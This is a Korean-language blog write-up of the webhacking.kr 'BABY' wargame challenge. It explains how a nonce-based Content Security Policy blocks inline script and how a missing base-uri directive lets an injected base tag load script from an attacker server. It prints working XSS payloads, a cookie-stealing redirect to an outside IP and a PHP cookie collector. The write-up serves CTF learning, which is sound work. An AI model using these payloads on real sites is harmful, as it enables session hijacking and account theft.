---
title: "[webhacking.kr] Challenge BABY 문제 풀이"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - XSS
  - BABY
  - CSP
  - base-uri
  - script-src
  - nonce
  - hash
toc: true
toc_sticky: true
toc_label: "BABY 문제 풀이"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/webhacking.jpg
---

💡 Webhacking.kr challenge BABY 문제에 대한 풀이입니다.
{: .notice--warning}

# 문제
문제는 2개의 페이지로 구성되어 있습니다.
첫번째 화면은 다음 처럼 `?inject=` GET방식으로 원하는 문자열을 inject 하는 기능이 있는 페이지입니다.

![image](https://user-images.githubusercontent.com/33647663/156695592-d713cfe2-71e5-415b-a7cc-4b2d0e47ebb4.png)

그 다음은 `report.php`페이지로 사용자가 입력한 주소를 관리자가 바로 접속을 하는 기능입니다.

![image](https://user-images.githubusercontent.com/33647663/156695694-e5c4808d-ede1-4540-846f-169b553b0b59.png)

이 문제는 전형적인 **XSS**를 이용하는 문제입니다. 첫 번째 inject 페이지에서 악성 스크립트(대부분 쿠키를 탈취하는 스크립트)가 삽입되도록 inject 값을 구성하고, 두번째 페이지에서 해당 페이지에 관리자 봇이 접속하도록 하여, 악성 스크립트가 관리자 봇에서 동작하게 하면 됩니다.

# 문제 풀이
우선 inject 페이지에서 사용자의 입력값이 바로 들어가는지 또는 필터링이 있는지 확인해 봅니다.

```html
inject=<script>alert(1)</script>
```

![image](https://user-images.githubusercontent.com/33647663/156696005-93a16e2c-ffaf-44d3-b8e3-ff47543c0a5a.png)

해당 페이지의 소스코드를 보면, 다음과 같이 스크립트가 정상적으로 삽입되었지만, alert(1)구문이 실행이 되지 않습니다. 

원인을 찾기 위해서 콘솔을 띄워 보니 다음의 오류가 출력되었습니다.

![image](https://user-images.githubusercontent.com/33647663/156696124-cb5c9583-8018-49a6-beab-aa53b14477b1.png)

```md
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'nonce-8U+ozHAw9t1UUZIQnkvFyQlu+Hg='". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.
```

해석을 해보면, CSP 지시자인 `script-src 'nonce-8U+ozHAw9t1UUZIQnkvFyQlu+Hg=`를 위반했기 때문에 inline script가 실행되지 않은 것을 알 수 있습니다.

따라서 이번 문제는 CSP를 우회하여 script가 실행되도록 해야 합니다.

뒤에 붙은 추가적인 에러 내용을 우선 짚고 넘어가 보겠습니다.

1. `unsafe-inline` 키워드를 사용
2. hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=')
3. nonce 값 넣기

를 하면 inline execution이 가능하다고 나옵니다.

우선 1번의 내용은 서버 측에서 CSP 정책을 설정할 때, unsafe-inline 지시자를 추가하여, 지금처럼 inline script가 실행되는 것을 허용하라는 의미입니다. 현재 클라이언트(공격자) 입장에서 지시자를 바꿀 수 없기 때문에 가능하지 않습니다.

2번 내용도 서버에서 설정을 하는 내용이며 CSP 정책을 설정할 때, 해시값을 넣어주는 것입니다. 위의 나온 해시값은 제가 입력한 스크립트(`<script>alert(1)</script>`)의 해시 값입니다. 이 개념은 서버측에서 스크립트에 대한 해시를 사전에 등록하여 정상적인 스크립트만 화이트리스트 방식으로 허용하는 것으로 생각하면 됩니다. 물론 해당 내용도 클라이언트에서 바꿀 수 없기 때문에 현재 문제에서는 가능하지 않습니다.

3번은 현재 서버측 CSP 지시자에 설정되어 있는 값으로, 사용자가 매번 요청할 때마다 랜덤한 nonce 값이 script에 추가되어 클라이언트에 전송됩니다. 따라서 서버공격자는 임의로 생성되는 nonce 값을 모르기 때문에 script를 실행할 수 없습니다.


현재 CSP 지시자는 다음과 같습니다. script-src에 nonce 값이 있어야만 결국에 스크립트가 작동됩니다. 

![image](https://user-images.githubusercontent.com/33647663/156748181-96f328b4-97fe-4cb5-b525-3e25aa15a93a.png)

처음에는 어떻게 이 문제를 해결해야 할 지 몰라서 다음의 CSP 설정에 대한 검사를 해주는 사이트에 문제의 url을 입력해 봤습니다.

https://csp-evaluator.withgoogle.com/

![image](https://user-images.githubusercontent.com/33647663/156748832-de03d580-da4a-4e39-af91-9ed7d7c28f26.png)

결과를 보면 2가지 위험 사항이 나옵니다.

1. object-src 지시자가 없기 때문에, Javascript가 실행가능한 plugin injection이 가능하다는 내용
2. base-uri 지시자가 없기 때문에, 공격자가 base-uri를 변경하여 상대경로로 지정한 스크립트를 공격자가 컨트롤하는 도메인 내에서 실행가능하게 할 수 있다는 내용입니다.


저는 위의 두가지 방법을 모두 시도해 봤습니다.

우선 object 를 이용하여 javascript를 실행하는 것은 다음처럼 가능합니다.

```javascript
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

코드의 내용은 `<script>alert(1)</script>`를 base64로 인코딩 하여 object 형식으로 전송한 것입니다. 이 내용이 브라우저에서 실행되면 다음과 같이 됩니다.

![image](https://user-images.githubusercontent.com/33647663/156750041-50f10d8d-c119-4cb8-9b26-d4fc0568e391.png)

하지만 위의 방법도 결국에는 object가 해석되면서 script로 실행되어서 nonce 값이 없기 때문에 동일하게 실행되지 않습니다. 이 문제에서는 사용하지 못했지만, 나중에 다른 문제에서 `<script>` 를 필터링 한다든지 하는 경우에 사용가능한 방법 같습니다.

그 다음은 base-uri를 이용한 방법입니다.문제에서 보면 `/script.js` 파일이 상대경로로 지정되어서 서버의 base-uri/script.js 파일이 실행되고 있습니다. 

![image](https://user-images.githubusercontent.com/33647663/156750333-f9bf68aa-4fbb-4272-87f0-733b3cab1b8c.png)

base-uri를 이용한 공격은 이 base-uri 값을 공격자의 도메인으로 바꿔서 `www.hacker.com/script.js` 가 실행되도록 하는 것입니다.

base-uri를 바꾸는 방법은 다음과 같습니다. 아래의 코드가 삽입되면 서버에서 base-uri가 공격자의 도메인으로 바뀝니다. 


```html
<base href="www.hacker.com"/>
```

우선 대상 서버에서 접속할 도메인에 script.js 파일에 alert(1)을 작성해주고, inject를 해서 base-uri를 바꿔줍니다.

![image](https://user-images.githubusercontent.com/33647663/156750967-e64ca1f6-5a06-4b70-84bc-f9a4dc5f7b68.png)

```html
?inject=<base href="http://3.35.110.110/">
```

성공적으로 제 서버에 있는 `script.js` 파일이 실행되었습니다.

![image](https://user-images.githubusercontent.com/33647663/156751993-a114c2c6-c5aa-44ed-938d-64132ae4cd9c.png)

이제 script.js안에 쿠키를 탈취하기 위해서 다음과 같이 작성해 줍니다.

```js
document.location="http://3.35.110.110/xss.php?cookie="+document.cookie;
```

그리고 쿠키 값을 저장하도록 xss.php 파일을 다음과 같이 작성해 줍니다.

```php
<?php
$cookie = $_GET['cookie'];
$save_file = fopen("/var/www/html/cookie","w");
fwrite($save_file,$cookie);
fclose($save_file);
?>
```

이제 report.php 파일에 가서 다음과 같이 리포트를 하면, 관리자의 쿠키가 공격자에게 전송되어서 쿠키 탈취가 가능해 집니다.

![image](https://user-images.githubusercontent.com/33647663/156752745-f3e3378e-7b49-4722-b04b-f4fe34a39bdc.png)

![image](https://user-images.githubusercontent.com/33647663/156752781-70f3dff5-dfb7-47af-b0d4-815e44911f1b.png)



# Reference
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/base-uri
https://jdh5202.tistory.com/820